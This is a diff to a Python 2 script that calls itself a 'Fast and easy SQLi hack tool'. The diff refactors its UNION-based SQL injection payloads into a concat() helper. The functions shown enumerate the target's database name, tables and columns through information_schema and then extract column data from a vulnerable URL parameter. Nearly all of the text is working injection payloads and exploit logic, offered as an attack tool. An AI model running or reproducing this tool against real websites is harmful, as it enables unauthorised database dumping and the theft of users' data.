@@ -18,7 +18,7 @@ ____ _              ___      _                     _____
 
 More: https://www.facebook.com/TheCybersTeam
 Usage: python sqli.py --url http://testphp.vulnweb.com/listproducts.php?cat=1
-Fast and easy SQLi hack tool Beta 1.1
+Fast and easy SQLi hack tool Beta 1.2
 """
 print header
 
@@ -104,6 +104,9 @@ def getVars(content):
         pos = ini.find("#'")
         return ini[:pos]
 
+def concat(string):
+    return "concat(0x27,0x23,group_concat(unhex(hex("+string+"))),0x23,0x27)"
+
 def getDatabase(vulCol,columns,url):
     global build
     line = ""
@@ -121,16 +124,17 @@ def getDatabase(vulCol,columns,url):
         else:
             build[side]+=line+str(i)
 
-    url = build[0] + "concat(0x27,0x23,database(),0x23,0x27)" + build[1]
+    url = build[0] + concat("database()") + build[1]
     res = getContent(url)
     return getVars(res)
 
 database = getDatabase(vulCol,columns,url)
 print "Database: "+database
 
+
 def getTables(database,vulCol,columns, url):
     global build
-    url = build[0] + "concat(0x27,0x23,group_concat(unhex(hex(table_name))),0x23,0x27)" + build[1] + " from+information_schema.tables where table_schema='"+database+"'"
+    url = build[0] + concat("table_name") + build[1] + " from+information_schema.tables where table_schema='"+database+"'"
     res = getContent(url)
     return getVars(res)
 
@@ -142,7 +146,7 @@ table = raw_input()
 
 def getColumns(table,database, volCol, columns, url):
     global build
-    url = build[0] + "concat(0x27,0x23,group_concat(unhex(hex(column_name))),0x23,0x27)" + build[1] + " from+information_schema.columns where table_name='"+table+"'"
+    url = build[0] + concat("column_name") + build[1] + " from+information_schema.columns where table_name='"+table+"'"
     res = getContent(url)
     return getVars(res)
 
@@ -155,7 +159,7 @@ column = raw_input()
 
 def getData(column, table,database, volCol, columns, url):
     global build
-    url = build[0] + "concat(0x27,0x23,group_concat(unhex(hex("+column+"))),0x23,0x27)" + build[1] + " from+"+table
+    url = build[0] + concat(column) + build[1] + " from+"+table
     res = getContent(url)
     return getVars(res)
 
